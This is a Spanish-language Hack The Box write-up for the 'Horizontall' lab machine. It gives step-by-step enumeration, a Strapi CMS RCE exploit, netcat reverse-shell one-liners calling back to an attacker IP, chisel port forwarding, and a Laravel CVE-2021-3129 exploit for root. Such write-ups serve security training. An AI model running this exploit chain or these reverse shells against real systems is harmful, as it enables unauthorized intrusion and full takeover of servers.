#  HORIZONTAL MACHINE

**Autor: Christian Jimenez**

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/1.png)


## ESCANEO Y ENUMERACION

vamos a realizar un escaneo con nmap:

```bash
nmap -p- --open -T5 - v -n 10.10.11.105 -oG allPorts
```

La salida nos muesta los sigueinets puertos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/2.png)

Vamos a realizar una enumeracion de los servicios en los puertos:

```bash
nmap -p22,80 -sV -sC 10.10.11.105 -oN targeted
```

este es el resultado:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/3.png)

## EXPLOTACION

Como tiene el puerto 80 abierto revisemos la pagina:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/4.png)

no encontramos nada interesante, veamos si podemos encontrar rutas potenciales:

```bash
wfuzz -c -t 100 --hw=33 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://horizontall.htb/FUZZ"
```

solo encontramos estas y todas muestran **forbidden**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/5.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/6.png)

intentamos buscar subdominios pero tampoco tuvimos exito:

```bash
wfuzz -c -t 100 --hw=43 --hc=400,404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -H "Host: FUZZ.horizontall.htb/" -u "http://horizontall.htb/"
```

no nos reporto nada, basicamente estamos jodidos.

En estas ocasiones puede ser que exita una ruta o subdominio pero no se encuentre en el diccionario, asi que es necesario inspeccionar el codigo fuente, porque puede que llamen a una URL interesante:

```bash
cul -s -k "http://horizontall.htb/" | grep http:
```

no da nada, intentemos entonces que archivos JS, ya que la ruta **/js** existe podriamos ver algun script interesante:

```bash
cul -s -k "http://horizontall.htb/" | grep js
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/7.png)

el que mas llama la atencion es el ultimo, veamos si podemos verlo desde el navegador:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/8.png)

si podemos, pero vemos mucha informacion asi que filtremos por lo que nos interesa (URLs):

```bash
curl -s -k "http://horizontall.htb/js/app.c68eb462.js" | grep http:
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/9.png)

al filtrarlo vemos una ruta interesante: **http://api-prod.horizontall.htb/reviews**, vemos un nuevo subdominio, veamos la pagina:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/10.png)

vemos unas opiniones en formato json, si le quitamos el review vemos esto:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/11.png)

pues nada muy util, tocara enumerar un poco este nuevo subdominio. Busquemos rutas potenciales:

```bash
wfuzz -c -t 100 --hw=33 --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u "http://api-prod.horizontall.htb/FUZZ"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/12.png)

tenemos otros directorios veamos el directorio de **admin**:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/13.png)

vemosun inicio de sesion, **strapi**, buscando en google di que es un CMS, podriamos buscar si hay vulnerabilidades para este CMS pero seria bueno encontrar la version especifica, lo podemos hacer de dos formas:

podemos ver la ruta **http://api-prod.horizontall.htb/admin/init** (investigado en google)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/14.png)

o su revisamos el codigo fuente daremos con un script llamado **/admin/main.da91597e.chunk.js**, si lo vemos desde el navegador y filtramos por **strapi** llegamos a esto:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/15.png)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/16.png)

ya que tenemos la version, busque una vulnerabilidad y di con esto:

[exploit](https://www.exploit-db.com/exploits/50239)

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/17.png)

es un script en python3 que solo debemos proporcionarle la URL:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/18.png)

lo ejecutamos:

```bash
python3 strapi.py http://api-prod.horizontall.htb/
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/19.png)

estamos dentro pero te dice que es una bind shell y lo que ejecutemos se ejecutara pero no mostrara por pantalla el resultado, asi que tenemos que enviarnos una reverse shell de alguna forma, como no podemos ver que tiene la maquina intente varias formas de enviarme una reverse shell y esta funciono:

[MonkeyPentester reverse shell](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.115 4545 >/tmp/f
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/20.png)

hagamos un tratamiento de la TTY:

```bash
script /dev/null -c bash
Ctrl Z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
```

y podemos ver la flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/21.png)

## ELEVACION DE PRIVILEGIOS

Realizamos la enumeracion basica del sistema pero no vio mucho, pasemosnos el linPEAS y veamos que hay:

[LinPEAS](https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh)

```bash
cat linpeas.sh | sh
```

de toda la salida en pantalla lo que llama la atencion es lo siguiente:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/22.png)

El puerto 8000 esta abierto localmente y no sabemos que corre ahi, lo hubieramos podido ver tambien con:

```bash
netstat -antp
```

necesitaremos hacer port forwarding para ver que hay en ese puerto, yo usare chisel para ello:

[chisel](https://github.com/jpillora/chisel)

kali:

```bash
./chisel server -p 4444 --reverse
```

victima:

```bash
./chisel client 10.10.14.115:4444 R:3333:127.0.0.1:8000
```

ahora podemos enumerar el puerto 3333 de nuestro equipo para ver que es:

```bash
nmap -p3333 -sC -sV 127.0.0.1
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/23.png)

parece una pagina web, veamos:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/24.png)

Es una pagina hecha con laravel y ahi vemos una version: **Laravel v8 (PHP v7.4.18)**.

veamos si hay vulnerabilidades para esa version.

Doy con este [exploit](https://github.com/nth347/CVE-2021-3129_exploit).

probemoslo, ahi dice como usar:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/25.png)

ejecutamos y tenenmos RCE:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/26.png)

es un proceso que lo esta ejecutando root. spwanemos una shell con netcat:

```bash
./exploit.py http://localhost:3333 Monolog/RCE1 "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.115 4646 >/tmp/f"
```

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/27.png)

ahora podemos ver la otra flag:

![foto](https://raw.githubusercontent.com/kriko69/CTF-writeups/main/HTB/HORIZONTALL/images/28.png)
